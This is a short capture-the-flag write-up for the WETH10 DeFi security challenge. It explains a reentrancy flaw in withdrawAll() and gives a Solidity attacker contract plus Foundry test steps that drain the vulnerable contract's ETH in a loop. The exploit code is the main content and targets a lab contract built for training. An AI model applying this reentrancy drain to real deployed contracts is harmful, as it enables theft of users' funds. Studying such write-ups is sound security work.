# Quill CTFs Write-Ups

## WETH10

**Author**: [0x4non](https://twitter.com/eugenioclrc) <br />
**Difficulty**: Medium <br />
**Type**: DeFi Security <br />

It is possible to transfer the tokens before being burned on the `withdrawAll()` function by using the `receive` function:


#### Attacker contract
```
pragma solidity ^0.8.0;

import "../WETH10.sol";

// Mario Götze
contract Attacker {
    WETH10 victim;
    address owner;

    constructor(WETH10 _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function attack() external {
        victim.withdrawAll();
    }

    function withdraw() external {
        require(msg.sender == owner);
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        victim.transfer(owner, victim.balanceOf(address(this)));
    }
}
```

#### Attack steps
```
        vm.startPrank(bob);
        
        Attacker attacker = new Attacker(weth, bob); // Deploy attacker

        weth.deposit{value: 1 ether}(); // ETH -> WETH
        weth.transfer(address(attacker), 1 ether); Transfer WETH to attacker

        // Drain the contract
        while (address(weth).balance != 0) {
            attacker.attack();
            weth.transfer(address(attacker), 1 ether);
        }

        attacker.withdraw(); // Transfer funds to Bob

        vm.stopPrank();
```
